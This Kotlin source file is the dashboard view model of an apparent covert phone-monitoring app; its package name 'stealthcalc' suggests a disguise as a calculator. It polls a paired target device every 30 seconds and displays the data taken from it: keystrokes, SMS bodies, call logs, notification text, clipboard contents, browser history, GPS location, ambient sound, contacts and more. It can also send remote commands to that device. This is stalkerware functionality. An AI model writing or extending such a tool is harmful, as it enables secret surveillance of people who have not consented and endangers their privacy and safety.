package com.stealthcalc.monitoring.ui

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.DeviceState
import com.stealthcalc.monitoring.model.EventPayload
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

enum class DashboardTab(val label: String, val kind: String?) {
    ALL("All", null),
    APPS("Apps", "APP_USAGE"),
    NOTIFICATIONS("Notifs", "NOTIFICATION"),
    CALLS("Calls", "CALL_LOG"),
    SMS("SMS", "SMS"),
    MEDIA("Media", "MEDIA_ADDED"),
    BATTERY("Battery", "BATTERY"),
    NETWORK("Network", "NETWORK"),
    SCREEN("Screen", "SCREEN_EVENT"),
    SECURITY("Security", "SECURITY_EVENT"),
    LOCATION("Location", "LOCATION"),
    INSTALLS("Installs", "APP_INSTALL"),
    KEYSTROKES("Keys", "KEYSTROKE"),
    WIFI("WiFi", "WIFI_HISTORY"),
    BROWSER("Browser", "BROWSER_HISTORY"),
    DEVICE("Device", "DEVICE_INFO"),
    DATA("Data", "DATA_USAGE"),
    CALENDAR("Cal", "CALENDAR_EVENT"),
    GEOFENCE("Geo", "GEOFENCE"),
    APPS_LIST("Apps List", "INSTALLED_APPS"),
    CONTACTS("Contacts", "CONTACT_FREQUENCY"),
    AMBIENT("Sound", "AMBIENT_SOUND"),
    STEPS("Steps", "STEP_COUNT"),
    SENSORS("Sensors", "SENSOR_DATA"),
    PERMS("Perms", "APP_PERMISSIONS"),
}

data class AppUsageEntry(
    val appName: String,
    val packageName: String,
    val foregroundCount: Int,
)

data class ParsedEvent(
    val raw: EventPayload,
    val title: String,
    val subtitle: String,
    val icon: String,
)

data class DashboardState(
    val isPaired: Boolean = false,
    val isLoading: Boolean = false,
    val error: String? = null,
    val deviceState: DeviceState? = null,
    val allEvents: List<EventPayload> = emptyList(),
    val parsedEvents: List<ParsedEvent> = emptyList(),
    val appUsage: List<AppUsageEntry> = emptyList(),
    val selectedTab: DashboardTab = DashboardTab.ALL,
    val lastRefresh: Long = 0L,
)

@HiltViewModel
class DashboardViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val json = Json { ignoreUnknownKeys = true }

    private val _state = MutableStateFlow(
        DashboardState(isPaired = repository.isPaired)
    )
    val state: StateFlow<DashboardState> = _state.asStateFlow()

    init {
        if (repository.isPaired) {
            startPolling()
        }
    }

    private fun startPolling() {
        viewModelScope.launch {
            while (isActive) {
                refresh()
                delay(30_000L)
            }
        }
    }

    fun selectTab(tab: DashboardTab) {
        _state.update { current ->
            current.copy(
                selectedTab = tab,
                parsedEvents = filterAndParse(current.allEvents, tab),
            )
        }
    }

    fun sendCommand(type: String) {
        viewModelScope.launch {
            apiClient.sendCommand(repository.deviceId, type)
        }
    }

    fun refresh() {
        viewModelScope.launch {
            _state.update { it.copy(isLoading = true, error = null) }
            val targetDeviceId = repository.deviceId
            if (targetDeviceId.isBlank()) {
                _state.update { it.copy(isLoading = false, error = "No paired device") }
                return@launch
            }
            val deviceState = apiClient.getDeviceState(targetDeviceId)
            val events = apiClient.getEvents(
                targetDeviceId,
                since = System.currentTimeMillis() - 24 * 3600 * 1000L
            )
            val tab = _state.value.selectedTab
            if (deviceState != null) {
                _state.update {
                    it.copy(
                        isLoading = false,
                        deviceState = deviceState,
                        allEvents = events,
                        parsedEvents = filterAndParse(events, tab),
                        appUsage = computeAppUsage(events),
                        lastRefresh = System.currentTimeMillis(),
                    )
                }
            } else {
                _state.update {
                    it.copy(
                        isLoading = false,
                        error = "Could not reach server",
                        allEvents = events,
                        parsedEvents = filterAndParse(events, tab),
                        appUsage = computeAppUsage(events),
                    )
                }
            }
        }
    }

    private fun filterAndParse(events: List<EventPayload>, tab: DashboardTab): List<ParsedEvent> {
        val filtered = if (tab.kind != null) events.filter { it.kind == tab.kind } else events
        return filtered.take(100).map { parseEvent(it) }
    }

    private fun parseEvent(event: EventPayload): ParsedEvent {
        val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull()

        return when (event.kind) {
            "APP_USAGE" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: "Unknown"
                val action = obj?.get("event")?.jsonPrimitive?.content ?: ""
                val verb = if (action == "FOREGROUND") "Opened" else "Closed"
                ParsedEvent(event, "$verb $app", "", "app")
            }
            "NOTIFICATION" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content ?: obj?.get("packageName")?.jsonPrimitive?.content ?: ""
                val title = obj?.get("title")?.jsonPrimitive?.content ?: ""
                val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "$app: $title", text, "notification")
            }
            "BATTERY" -> {
                val level = obj?.get("level")?.jsonPrimitive?.content ?: "?"
                val charging = obj?.get("isCharging")?.jsonPrimitive?.content == "true"
                val temp = obj?.get("temperature")?.jsonPrimitive?.content?.toIntOrNull()
                val tempStr = if (temp != null) " / ${temp / 10.0}\u00B0C" else ""
                ParsedEvent(event, "Battery $level%${if (charging) " charging" else ""}$tempStr", "", "battery")
            }
            "NETWORK" -> {
                val ssid = obj?.get("ssid")?.jsonPrimitive?.content
                val connected = obj?.get("connected")?.jsonPrimitive?.content == "true"
                val type = obj?.get("type")?.jsonPrimitive?.content ?: ""
                val status = if (connected) "Connected" else "Disconnected"
                val detail = if (ssid != null) "$type: $ssid" else type
                ParsedEvent(event, "$status — $detail", "", "network")
            }
            "SCREEN_EVENT" -> {
                val action = obj?.get("event")?.jsonPrimitive?.content ?: ""
                val label = when (action) {
                    "SCREEN_ON" -> "Screen turned on"
                    "SCREEN_OFF" -> "Screen turned off"
                    "USER_PRESENT" -> "Device unlocked"
                    else -> action
                }
                ParsedEvent(event, label, "", "screen")
            }
            "APP_INSTALL" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: "Unknown"
                val action = obj?.get("action")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "$app — ${action.lowercase()}", "", "install")
            }
            "LOCATION" -> {
                val lat = obj?.get("latitude")?.jsonPrimitive?.content ?: "?"
                val lon = obj?.get("longitude")?.jsonPrimitive?.content ?: "?"
                val acc = obj?.get("accuracy")?.jsonPrimitive?.content ?: "?"
                ParsedEvent(event, "Location: $lat, $lon", "Accuracy: ${acc}m", "location")
            }
            "CALL_LOG" -> {
                val number = obj?.get("number")?.jsonPrimitive?.content ?: ""
                val name = obj?.get("contactName")?.jsonPrimitive?.content
                val type = obj?.get("type")?.jsonPrimitive?.content ?: ""
                val duration = obj?.get("duration")?.jsonPrimitive?.content?.toIntOrNull() ?: 0
                val display = name ?: number
                val durationStr = if (duration > 0) " (${duration / 60}m${duration % 60}s)" else ""
                ParsedEvent(event, "${type.lowercase().replaceFirstChar { it.uppercase() }} call: $display$durationStr", "", "call")
            }
            "SMS" -> {
                val address = obj?.get("address")?.jsonPrimitive?.content ?: ""
                val name = obj?.get("contactName")?.jsonPrimitive?.content
                val body = obj?.get("body")?.jsonPrimitive?.content ?: ""
                val type = obj?.get("type")?.jsonPrimitive?.content ?: ""
                val display = name ?: address
                val prefix = if (type == "SENT") "To" else "From"
                ParsedEvent(event, "$prefix $display", body, "sms")
            }
            "MEDIA_ADDED" -> {
                val name = obj?.get("displayName")?.jsonPrimitive?.content ?: ""
                val mType = obj?.get("mediaType")?.jsonPrimitive?.content ?: ""
                val size = obj?.get("sizeBytes")?.jsonPrimitive?.content?.toLongOrNull() ?: 0
                val sizeStr = if (size > 1_000_000) "${size / 1_000_000}MB" else "${size / 1000}KB"
                ParsedEvent(event, "New $mType: $name", sizeStr, "media")
            }
            "SECURITY_EVENT" -> {
                val secEvent = obj?.get("event")?.jsonPrimitive?.content ?: ""
                val details = obj?.get("details")?.jsonPrimitive?.content ?: ""
                val label = secEvent.lowercase().replace("_", " ").replaceFirstChar { it.uppercase() }
                ParsedEvent(event, label, details, "security")
            }
            "CLIPBOARD" -> {
                val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "Clipboard copied", text.take(100), "clipboard")
            }
            "KEYSTROKE" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: ""
                val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "Typed in $app", text, "keystroke")
            }
            "WIFI_HISTORY" -> {
                val ssid = obj?.get("ssid")?.jsonPrimitive?.content ?: ""
                val signal = obj?.get("signalLevel")?.jsonPrimitive?.content ?: ""
                val ip = obj?.get("ipAddress")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "WiFi: $ssid (signal $signal/4)", "IP: $ip", "wifi")
            }
            "BROWSER_HISTORY" -> {
                val url = obj?.get("url")?.jsonPrimitive?.content ?: ""
                val title = obj?.get("title")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, title.ifBlank { url.take(60) }, url.take(80), "browser")
            }
            "SIM_CHANGE" -> {
                val state = obj?.get("simState")?.jsonPrimitive?.content ?: ""
                val carrier = obj?.get("carrierName")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "SIM: $state", carrier, "sim")
            }
            "DEVICE_INFO" -> {
                val freeStorage = obj?.get("freeStorage")?.jsonPrimitive?.content?.toLongOrNull() ?: 0
                val freeRam = obj?.get("freeRam")?.jsonPrimitive?.content?.toLongOrNull() ?: 0
                val apps = obj?.get("runningApps")?.jsonPrimitive?.content ?: "0"
                ParsedEvent(event, "Storage: ${freeStorage / 1_000_000_000}GB free / RAM: ${freeRam / 1_000_000}MB", "$apps running apps", "device")
            }
            "DATA_USAGE" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content
                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: ""
                val tx = obj?.get("txBytes")?.jsonPrimitive?.content?.toLongOrNull() ?: 0
                val rx = obj?.get("rxBytes")?.jsonPrimitive?.content?.toLongOrNull() ?: 0
                val total = (tx + rx) / 1_000_000
                ParsedEvent(event, "$app: ${total}MB", "TX: ${tx / 1_000_000}MB / RX: ${rx / 1_000_000}MB", "data")
            }
            "CALENDAR_EVENT" -> {
                val title = obj?.get("title")?.jsonPrimitive?.content ?: ""
                val location = obj?.get("location")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, title, location, "calendar")
            }
            "GEOFENCE" -> {
                val zone = obj?.get("zoneName")?.jsonPrimitive?.content ?: ""
                val geoEvent = obj?.get("event")?.jsonPrimitive?.content ?: ""
                ParsedEvent(event, "$geoEvent zone: $zone", "", "geofence")
            }
            "INSTALLED_APPS" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content ?: ""
                val version = obj?.get("versionName")?.jsonPrimitive?.content ?: ""
                val system = obj?.get("isSystemApp")?.jsonPrimitive?.content == "true"
                ParsedEvent(event, "$app v$version", if (system) "System app" else "User app", "app_list")
            }
            "AMBIENT_SOUND" -> {
                val peak = obj?.get("peakAmplitude")?.jsonPrimitive?.content ?: "0"
                val triggered = obj?.get("triggered")?.jsonPrimitive?.content == "true"
                ParsedEvent(event, if (triggered) "Sound detected! (peak: $peak)" else "Quiet (peak: $peak)", "", "ambient")
            }
            "CONTACT_FREQUENCY" -> {
                val name = obj?.get("contactName")?.jsonPrimitive?.content
                    ?: obj?.get("identifier")?.jsonPrimitive?.content ?: ""
                val calls = obj?.get("callCount")?.jsonPrimitive?.content ?: "0"
                val sms = obj?.get("smsCount")?.jsonPrimitive?.content ?: "0"
                ParsedEvent(event, name, "$calls calls, $sms messages (7d)", "contact")
            }
            "STEP_COUNT" -> {
                val steps = obj?.get("steps")?.jsonPrimitive?.content ?: "0"
                val minutes = obj?.get("periodMinutes")?.jsonPrimitive?.content ?: "0"
                ParsedEvent(event, "$steps steps", "in ${minutes}min", "steps")
            }
            "SENSOR_DATA" -> {
                val near = obj?.get("proximityNear")?.jsonPrimitive?.content
                val light = obj?.get("lightLevel")?.jsonPrimitive?.content
                val moving = obj?.get("isMoving")?.jsonPrimitive?.content == "true"
                val prox = if (near == "true") "In pocket" else "Open"
                ParsedEvent(event, "$prox / ${if (moving) "Moving" else "Still"}", "Light: ${light ?: "?"}lx", "sensor")
            }
            "APP_PERMISSIONS" -> {
                val app = obj?.get("appName")?.jsonPrimitive?.content ?: ""
                val granted = obj?.get("dangerousGranted")?.toString() ?: "[]"
                ParsedEvent(event, app, "Dangerous: $granted", "permissions")
            }
            else -> ParsedEvent(event, event.kind, event.payload.take(80), "unknown")
        }
    }

    private fun computeAppUsage(events: List<EventPayload>): List<AppUsageEntry> {
        val counts = mutableMapOf<String, Pair<String, Int>>()
        events.filter { it.kind == "APP_USAGE" }.forEach { event ->
            val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: return@forEach
            val action = obj["event"]?.jsonPrimitive?.content ?: return@forEach
            if (action != "FOREGROUND") return@forEach
            val pkg = obj["packageName"]?.jsonPrimitive?.content ?: return@forEach
            val name = obj["appName"]?.jsonPrimitive?.content ?: pkg
            val (_, count) = counts.getOrDefault(pkg, name to 0)
            counts[pkg] = name to (count + 1)
        }
        return counts.entries
            .sortedByDescending { it.value.second }
            .take(10)
            .map { (pkg, pair) -> AppUsageEntry(pair.first, pkg, pair.second) }
    }
}
